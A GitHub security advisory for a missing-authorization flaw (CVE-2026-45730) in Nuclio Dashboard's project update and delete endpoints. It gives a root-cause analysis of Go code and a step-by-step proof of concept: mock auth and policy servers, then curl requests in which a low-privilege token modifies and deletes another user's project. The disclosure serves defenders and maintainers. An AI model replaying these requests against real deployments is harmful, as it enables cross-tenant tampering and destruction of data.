# [H] Nuclio: Missing authorization on project write paths allows any authenticated user to modify or delete any project

## Summary
Severity: High
Advisory: GHSA-m8xg-8xg9-mxhm
CVE: CVE-2026-45730
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-m8xg-8xg9-mxhm
Type: github-advisory

## Affected
- Go: `github.com/nuclio/nuclio` — affected >=0 <0.0.0-20260513101907-1915cd26d514

## Details
This vulnerability exists in Nuclio Dashboard's project management API, allowing any authenticated user (without membership in the target project) to bypass OPA authorization checks on write paths (`PUT /api/projects/{id}`, `DELETE /api/projects`) and modify or delete any project along with all its associated resources (functions, API gateways, etc.). CWE classification: CWE-862 (Missing Authorization).

---

## Summary

Nuclio Dashboard correctly enforces OPA-based authorization on the project read path (`GET /api/projects`), populating `MemberIds` in `PermissionOptions` so OPA can filter results by user membership. However, the write paths (`PUT /api/projects/{id}` and `DELETE /api/projects`) construct `PermissionOptions` without setting `MemberIds`. The platform-layer `FilterProjectsByPermissions` function (`pkg/platform/abstract/platform.go:652`) short-circuits when `MemberIds` is empty, bypassing OPA entirely. Any authenticated user who knows a project name can modify or delete that project, triggering cascading deletion of all associated Functions, APIGateways, and FunctionEvents.

Affected: Nuclio v1.15.26 (latest Helm release) and HEAD commit e185454 (latest source).

---

## Attacker Model

**Attacker type**: Authenticated low-privilege tenant (no membership in the target project)

**Initial access**:
- Holds any valid Nuclio Dashboard credentials
- The account has no membership in the target project (OPA correctly denies `GET /api/projects`, returning an empty list)
- No Kubernetes RBAC permissions required — the vulnerability is triggered at the Dashboard application layer, not via K8s API Server

**Attacker location**: Authenticated user; network position depends on deployment:
- Typical Iguazio/MLRun enterprise deployment: Dashboard is exposed via load balancer to internal or public networks
- Self-hosted deployment: Dashboard is usually limited to cluster-internal or internal network access
- Conservative baseline: authenticated-internal; for public-facing deployments, reachability should be rated higher

**User interaction required**: None
- The attacker directly sends HTTP requests to `PUT /api/projects/{id}` or `DELETE /api/projects` to trigger the vulnerability; no action from the target user is required

**Privilege gap**:

```
Before: Authenticated account with zero permissions on target project
        (OPA correctly denies GET, returns empty list)
   ↓
After:  Can modify or delete any project on the platform
        Can trigger cascading deletion of all associated Functions,
        APIGateways, and FunctionEvents
        Can modify project configuration, affecting NuclioProject CRD
        in Kubernetes deployments
```

**Exploitation difficulty**: Very low — four-step attack chain, each step requiring no special technical skill.

---

## Details

### Root Cause

The read and write paths diverge in how they populate `PermissionOptions.MemberIds`:

**Read path (correct implementation)** — `pkg/dashboard/resource/project.go:87-90`
```go
PermissionOptions: opaclient.PermissionOptions{
    MemberIds:           opa.GetUserAndGroupIdsFromAuthSession(pr.getCtxSession(ctx)),
    OverrideHeaderValue: request.Header.Get(headers.ProjectsRole),
},
```

**Write path Update (vulnerable)** — `pkg/dashboard/resource/project.go:194-196`
```go
PermissionOptions: opaclient.PermissionOptions{
    OverrideHeaderValue: request.Header.Get(headers.ProjectsRole),
    // MemberIds is not set — OPA check will be skipped
},
```

**Write path deleteProject (vulnerable)** — `pkg/dashboard/resource/project.go:686-688`
```go
PermissionOptions: opaclient.PermissionOptions{
    OverrideHeaderValue: request.Header.Get(headers.ProjectsRole),
    // MemberIds is not set — OPA check will be skipped
},
```

**Short-circuit bypass** — `pkg/platform/abstract/platform.go:652`
```go
func (ap *Platform) FilterProjectsByPermissions(...) ([]platform.Project, error) {
    if len(permissionOptions.MemberIds) == 0 || len(projects) == 0 {
        return projects, nil  // skips OPA entirely
    }
    allowedList, err := ap.QueryOPAMultipleResources(...)
}
```

**Kubernetes platform write paths (no OPA at all)** — `pkg/platform/kube/platform.go:779-793`
```go
func (p *Platform) UpdateProject(ctx context.Context, updateProjectOptions *platform.UpdateProjectOptions) error {
    if err := p.ValidateProjectConfig(ctx, &updateProjectOptions.Project); err != nil { ... }
    if _, err := p.projectsClient.Update(ctx, updateProjectOptions); err != nil { ... }
    return nil  // no OPA call
}

func (p *Platform) DeleteProject(ctx context.Context, deleteProjectOptions *platform.DeleteProjectOptions) error {
    if err := p.ValidateDeleteProjectOptions(ctx, deleteProjectOptions); err != nil { ... }
    if err := p.projectsClient.Delete(ctx, deleteProjectOptions); err != nil { ... }
    return nil  // no OPA call
}
```

### Sanitizer Coverage Analysis

All validation functions on the write path are format-only and contain no identity or ownership-based authorization checks:

**ValidateProjectConfig** — `pkg/platform/abstract/platform.go:854-879`
```go
func (ap *Platform) ValidateProjectConfig(projectConfig *platform.ProjectConfig) error {
    if projectConfig.Meta.Name == "" { return ... }          // name not empty
    if err := utils.ValidateLabels(...); err != nil { ... }  // labels format
    if err := utils.ValidateLabels(...); err != nil { ... }  // node selector format
    errorMessages := validation.IsDNS1123Label(...)          // DNS naming convention
    return nil
    // No identity check, no ownership check, no OPA call
}
```

Pure format validation — no identity or resource-ownership checks of any kind.

**ValidateDeleteProjectOptions (false security check)** — `pkg/platform/abstract/platform.go:536-576`
```go
func (ap *Platform) ValidateDeleteProjectOptions(ctx context.Context,
    deleteProjectOptions *platform.DeleteProjectOptions) error {
    // ...
    projects, err := ap.platform.GetProjects(ctx, &platform.GetProjectsOptions{
        Meta:              deleteProjectOptions.Meta,
        PermissionOptions: deleteProjectOptions.PermissionOptions,  // MemberIds still empty!
        // ...
    })
    // ...
    if len(projects) == 0 { return nil }  // project doesn't exist, exit early
    // Check for associated functions/API gateways
}
```

This function calls `GetProjects` passing along the `PermissionOptions` inherited from the caller — with `MemberIds` still empty. The inner OPA query is therefore also bypassed by the same short-circuit. It appears to validate project existence and associated resources, but the identity check is silently absent. This is a false security check.

**Conclusion**: Two validation layers exist on the write path; both are format-only. No identity-based authorization check exists anywhere in the write path, leaving the entire defense chain ineffective at the application layer.

### Call Chain Comparison

Read path (correctly blocks unauthorized access):
```
GET /api/projects
  → GetAll() [project.go:71]
    → MemberIds = GetUserAndGroupIdsFromAuthSession() [project.go:88]
    → platform.GetProjects(MemberIds=[uid, gid1, ...])
    → FilterProjectsByPermissions(MemberIds=[uid, gid1, ...])
    → OPA filter_allowed called → unauthorized user gets empty list ✓
```

Write path (authorization bypassed):
```
PUT /api/projects/{id}
  → Update() [project.go:165]
    → MemberIds = (not set) [project.go:194]
    → platform.UpdateProject(MemberIds=[])
    → ValidateProjectConfig() ← format-only, no auth check
    → projectsClient.Update() → project modified, no OPA check

DELETE /api/projects
  → deleteProject() [project.go:663]
    → MemberIds = (not set) [project.go:686]
    → platform.DeleteProject(MemberIds=[])
    → ValidateDeleteProjectOptions()
      → inner GetProjects(MemberIds=[]) → OPA bypassed again (false security check)
    → projectsClient.Delete() → project deleted, no OPA check
```

For reference, the function write path is correctly implemented (`pkg/dashboard/resource/function.go:564-566`), confirming this is an omission specific to project write paths:
```go
PermissionOptions: opaclient.PermissionOptions{
    MemberIds:           opa.GetUserAndGroupIdsFromAuthSession(fr.getCtxSession(ctx)),
    OverrideHeaderValue: request.Header.Get(headers.ProjectsRole),
},
```

---

## PoC (Proof of Concept)

### Environment Setup

This verification uses the Nuclio Dashboard binary compiled from source, paired with a mock Iguazio auth server and a mock OPA server. No Kubernetes cluster is required.

**Step 1: Prepare working directory**

```bash
mkdir -p /tmp/nuclio-vul001-test/logs

# Create empty templates archive required by dashboard on startup
python3 -c "import zipfile; z = zipfile.ZipFile('/tmp/templates.zip', 'w'); z.close()"
```

**Step 2: Build Nuclio Dashboard binary from source (HEAD commit e185454)**

```bash
cd /path/to/nuclio-source

GOPROXY="https://goproxy.io,direct" \
GONOSUMCHECK="code.cloudfoundry.org/*" \
GOFLAGS="-mod=mod" \
go build -o /tmp/nuclio-vul001-test/nuclio-dashboard \
    ./cmd/dashboard/main.go

ls -lh /tmp/nuclio-vul001-test/nuclio-dashboard
# Expected: -rwxr-xr-x ... 135M ... nuclio-dashboard
```

**Step 3: Deploy mock Iguazio Auth + OPA server**

Save as `/tmp/nuclio-vul001-test/mock_server.py`:

```python
#!/usr/bin/env python3
"""
Mock server for VUL-001 verification:
- Port 9998: Iguazio auth session verification endpoint
- Port 9999: OPA permission check endpoint

Token mapping:
  admin-token  -> uid-admin-001 / gid-admin  (full access to all projects)
  reader-token -> uid-reader-002 / gid-reader (no access to any project)
"""

import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

ADMIN_IDS = {"uid-admin-001", "admin", "gid-admin"}
READER_IDS = {"uid-reader-002", "reader", "gid-reader"}


class MockIguazioAuthHandler(BaseHTTPRequestHandler):
    def do_GET(self): self._handle_verify()
    def do_POST(self): self._handle_verify()

    def _handle_verify(self):
        auth = self.headers.get("authorization", "")
        if "admin-token" in auth:
            uid, gids, username = "uid-admin-001", ["gid-admin"], "admin"
        elif "reader-token" in auth:
            uid, gids, username = "uid-reader-002", ["gid-reader"], "reader"
        else:
            self.send_response(401); self.end_headers(); return

        # Return iguazio session verification response format
        body = json.dumps({"data": {"attributes": {"context": {"authentication": {
            "user_id": uid, "group_ids": gids
        }}}}}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("x-remote-user", username)
        self.send_header("x-v3io-session-key", f"{username}-session-key")
        self.end_headers()
        self.wfile.write(body)
        print(f"[AUTH] Verified: {username}", flush=True)

    def log_message(self, *args): pass


class MockOPAHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = json.loads(self.rfile.read(length))
        inp = data.get("input", {})
        ids, resources = inp.get("ids", []), inp.get("resources", [])
        is_admin = any(i in ADMIN_IDS for i in ids)

        if self.path == "/v1/data/iguazio/authz/filter_allowed":
            # Filter: admin sees all, reader sees nothing
            result = resources if is_admin else []
            print(f"[OPA FILTER] ids={ids} -> {'ALLOW' if is_admin else 'DENY'} {result}", flush=True)
        elif self.path == "/v1/data/iguazio/authz/allow":
            result = is_admin
            print(f"[OPA ALLOW] ids={ids} -> {result}", flush=True)
        else:
            result = True

        body = json.dumps({"result": result}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args): pass


def run(handler, port, name):
    s = HTTPServer(("127.0.0.1", port), handler)
    print(f"[*] {name} listening on port {port}", flush=True)
    s.serve_forever()

if __name__ == "__main__":
    for handler, port, name in [
        (MockIguazioAuthHandler, 9998, "Mock Iguazio Auth"),
        (MockOPAHandler, 9999, "Mock OPA"),
    ]:
        t = threading.Thread(target=run, args=(handler, port, name), daemon=True)
        t.start()
    print("[*] Mock servers ready. Ctrl+C to stop.", flush=True)
    import time
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
```

Save as `/tmp/nuclio-vul001-test/platform.yaml`:

```yaml
opa:
  address: "http://127.0.0.1:9999"
  clientKind: "http"
  permissionQueryPath: "/v1/data/iguazio/authz/allow"
  permissionFilterPath: "/v1/data/iguazio/authz/filter_allowed"
  verbose: true
```

Start the mock servers:

```bash
python3 /tmp/nuclio-vul001-test/mock_server.py \
    > /tmp/nuclio-vul001-test/logs/mock_server.log 2>&1 &
MOCK_PID=$!
sleep 1
```

**Step 4: Start Nuclio Dashboard**

```bash
/tmp/nuclio-vul001-test/nuclio-dashboard \
  --platform=local \
  --listen-addr=:8070 \
  --auth-config-kind=iguazio \
  --auth-config-iguazio-verification-url="http://127.0.0.1:9998/verify" \
  --auth-config-iguazio-verification-method=GET \
  --auth-config-iguazio-timeout=10s \
  --auth-config-iguazio-cache-size=100 \
  --auth-config-iguazio-cache-expiration-timeout=10s \
  --platform-config="/tmp/nuclio-vul001-test/platform.yaml" \
  --namespace="test-ns" \
  --monitor-docker-deamon=false \
  --offline=true \
  > /tmp/nuclio-vul001-test/logs/dashboard.log 2>&1 &
DASHBOARD_PID=$!
sleep 5

kill -0 $DASHBOARD_PID && echo "Dashboard started successfully" || \
  { echo "Dashboard failed"; tail -20 /tmp/nuclio-vul001-test/logs/dashboard.log; exit 1; }
```

**Step 5: Verify authentication is active**

```bash
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:8070/api/projects -H "x-nuclio-namespace: test-ns")
echo "Unauthenticated request: HTTP $HTTP_CODE"
# Expected: HTTP 401
```

Actual output:
```
Unauthenticated request: HTTP 401
```

### Exploitation Steps

**Step 1: Admin creates a test project (HTTP 201)**

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://localhost:8070/api/projects \
  -H "Authorization: admin-token" \
  -H "x-nuclio-namespace: test-ns" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"name":"vul001-poc-project","namespace":"test-ns"},"spec":{"description":"Original description by admin"}}'
```

Output: `201`

**Step 2: Reader attempts GET — OPA correctly denies (HTTP 200, empty result)**

```bash
curl -s -H "Authorization: reader-token" -H "x-nuclio-namespace: test-ns" \
  http://localhost:8070/api/projects
```

Output: `{}`

Dashboard log (OPA is invoked on read path):
```
16:16:53 [D] dashboard.iguazio-auth Successfully authenticated: sessionUsername=reader
16:16:54 [I] dashboard.platform.opa Sending request to OPA
  {"requestBody":"{\"input\":{\"resources\":[\"/projects/vul001-poc-project\"],\"action\":\"read\",\"ids\":[\"uid-reader-002\",\"reader\",\"gid-reader\"]}}"}
16:16:54 [I] dashboard.platform.opa Received response: {"result": []}
```

Mock OPA server log:
```
[OPA FILTER] ids=['uid-reader-002', 'reader', 'gid-reader'] -> DENY []
```

The read path correctly blocks the reader.

**Step 3: Reader exploits vulnerable PUT path — unauthorized modification (HTTP 204)**

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -X PUT \
  -H "Authorization: reader-token" \
  -H "x-nuclio-namespace: test-ns" \
  -H "Content-Type: application/json" \
  "http://localhost:8070/api/projects/vul001-poc-project" \
  -d '{"metadata":{"name":"vul001-poc-project","namespace":"test-ns"},"spec":{"description":"MODIFIED_BY_LOW_PRIV_READER"}}'
```

Output: `204`

**Expected: 403 Forbidden. Actual: 204 No Content — unauthorized modification succeeded.**

Dashboard log (no OPA entries on the PUT path — contrast with Step 2):
```
16:17:47 [D] dashboard.iguazio-auth Successfully authenticated: sessionUsername=reader
16:17:47 [D] d.platform.projects-local Updating a project {"projectName":"vul001-poc-project"}
16:17:47 [D] dashboard.store Writing file contents {"description":"MODIFIED_BY_LOW_PRIV_READER"}
16:17:47 [D] dashboard.server Handled request: PUT /api/projects/vul001-poc-project → 204
```

**Step 4: Admin verifies modification persisted**

```bash
curl -s -H "Authorization: admin-token" -H "x-nuclio-namespace: test-ns" \
  "http://localhost:8070/api/projects/vul001-poc-project" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['spec']['description'])"
```

Output:
```
MODIFIED_BY_LOW_PRIV_READER
```

**Step 5: Reader exploits vulnerable DELETE path — unauthorized deletion (HTTP 204)**

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -X DELETE \
  -H "Authorization: reader-token" \
  -H "x-nuclio-namespace: test-ns" \
  -H "Content-Type: application/json" \
  http://localhost:8070/api/projects \
  -d '{"metadata":{"name":"vul001-poc-project","namespace":"test-ns"}}'
```

Output: `204`

**Expected: 403 Forbidden. Actual: 204 No Content — unauthorized deletion succeeded.**

Dashboard log (no OPA entries on the DELETE path):
```
16:18:14 [D] dashboard.iguazio-auth Successfully authenticated: sessionUsername=reader
16:18:14 [D] d.platform.projects-local Deleting a project {"projectMeta":{"name":"vul001-poc-project","namespace":"test-ns"}}
16:18:14 [D] dashboard.server Handled request: DELETE /api/projects → 204
```

**Step 6: Admin confirms project is gone**

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: admin-token" -H "x-nuclio-namespace: test-ns" \
  "http://localhost:8070/api/projects/vul001-poc-project"
```

Output: `404`

### Expected Result

| Operation | User | OPA Called | HTTP Status | Result |
|-----------|------|-----------|------------|--------|
| GET /api/projects | reader | Yes | 200 (empty) | Read path protected correctly |
| PUT /api/projects/{id} | reader | **No** | **204** | **Vulnerable: unauthorized modification** |
| DELETE /api/projects | reader | **No** | **204** | **Vulnerable: unauthorized deletion** |
| GET /api/projects/{id} | admin | — | 200 | Modification confirmed persisted |
| GET /api/projects/{id} | admin | — | 404 | Deletion confirmed |

---

## Impact

### Multi-Tenant Isolation Breach (Trust Boundary)

This vulnerability is a **Multi-Tenant Isolation Breach** — the attacker crosses the Nuclio Dashboard tenant isolation boundary to perform write operations on resources they have no access to:

```
Tenant B (authenticated, no rights on target project)
  ↓ Write path OPA check completely absent
Nuclio Dashboard (application-layer trust boundary,
                  should isolate tenant data)
  ↓ Direct write to storage layer (no identity verification)
Tenant A's project data (cross-tenant write/delete)
  ↓ Cascades to
All associated Functions, APIGateways, FunctionEvents deleted or tampered
```

**Confidentiality (C:L)**

The read path is protected by OPA; the attacker cannot enumerate project contents via GET. However, the attacker can infer project existence by sending PUT/DELETE requests and observing response codes (204 vs 404), creating a side-channel information leak. The actual project data content is not directly readable.

**Integrity (I:H)**

Any authenticated user can modify the configuration of any project on the platform, including:
- Project description and metadata
- In Kubernetes deployments: NuclioProject CRD fields that affect Nuclio controller reconciliation behavior, such as `DefaultFunctionNodeSelector` and `DefaultFunctionPriorityClassName`, which influence subsequent function deployments under the project

**Availability (A:H)**

Any authenticated user can delete any project, triggering cascading deletion of all associated Functions, APIGateways, and FunctionEvents. These operations are irreversible through normal means.

### Kubernetes Deployment Impact Analysis

In Kubernetes deployments, each Nuclio project maps to a NuclioProject CRD. The Nuclio controller (`nuclio-controller`) continuously watches NuclioProject resources and reconciles state:

- **Modification impact**: NuclioProject Spec fields such as `DefaultFunctionNodeSelector` and `DefaultFunctionPriorityClassName` affect deployment templates for functions under that project when reconciled. An attacker modifying these fields can influence the execution environment of functions subsequently deployed under the compromised project.
- **Deletion impact**: Deleting a NuclioProject CRD triggers the controller to cascade-delete all associated NuclioFunction, NuclioAPIGateway, and related CRD resources in the namespace.

The currently known attack path does not directly modify ServiceAccount or ClusterRoleBinding resources. Credential theft risk is low on the direct path, but the indirect impact on function execution environments warrants monitoring.

### Typical Attack Scenarios

- In a multi-tenant Nuclio environment, Tenant B with a low-privilege account can modify or delete Tenant A's projects by knowing the project name (obtainable via guessing or internal information)
- An attacker systematically deletes all projects on the platform, causing platform-wide service disruption not bounded by namespace
- Modifying another tenant's project configuration in Kubernetes environments affects function deployment behavior (node selection, resource quotas)

---

## Severity

**Scope Justification (S:U vs S:C)**

The current score uses S:U. Under CVSS 3.1, S:C requires that the affected component operates in a different authorization scope from the vulnerable component. Here, both the attacker's session and the victim's project resources fall within the same Nuclio Dashboard authorization domain; the tenant isolation is a logical boundary within the application rather than a separate authorization authority. From a strict CVSS 3.1 perspective, S:U is more accurate.

However, since the vulnerability enables one tenant to affect another tenant's resources, an argument can be made for S:C from the perspective that the attacker's authorization context and the victim's resource authority are logically distinct. The Scope selection rationale should be noted in the submission for the recipient to make a final determination.

---

## Affected Versions

- Nuclio HEAD commit e185454 (latest source, dynamically verified)
- Nuclio v1.15.26 (latest Helm chart release, same code path confirmed)
- All versions with iguazio or iguazio-v4 authentication enabled

Deployments using the default `nop` authentication mode are not affected, but production Iguazio environments always use iguazio authentication.

---

## Patched Versions

No patched version available as of 2026-05-06.

---

## Workarounds

Until an official fix is released:

1. **Network-level restriction**: Use firewall rules or Kubernetes NetworkPolicy to restrict Dashboard API access to trusted clients only
2. **Credential control**: Strictly limit distribution of Nuclio Dashboard credentials to minimize low-privilege account exposure
3. **Audit logging**: Enable access logging on `PUT /api/projects/` and `DELETE /api/projects` paths and monitor for anomalous operations

---

## References

- Vulnerable code (missing MemberIds on write path): `pkg/dashboard/resource/project.go:194`, `:686`
- Short-circuit bypass: `pkg/platform/abstract/platform.go:652`
- False security check: `pkg/platform/abstract/platform.go:536-576`
- Format-only validation (no auth check): `pkg/platform/abstract/platform.go:854-879`
- Kubernetes platform write paths (no OPA): `pkg/platform/kube/platform.go:779-793`
- Correct read path implementation (reference): `pkg/dashboard/resource/project.go:87-90`
- Correct function write path implementation (reference): `pkg/dashboard/resource/function.go:564-566`
- Nuclio GitHub repository: https://github.com/nuclio/nuclio

## References
- https://github.com/nuclio/nuclio/security/advisories/GHSA-m8xg-8xg9-mxhm
- https://github.com/nuclio/nuclio/pull/4107
- https://github.com/nuclio/nuclio/commit/1915cd26d514dcdd487517d4be56673fc02298e0
- https://github.com/nuclio/nuclio
- https://github.com/nuclio/nuclio/releases/tag/1.16.0
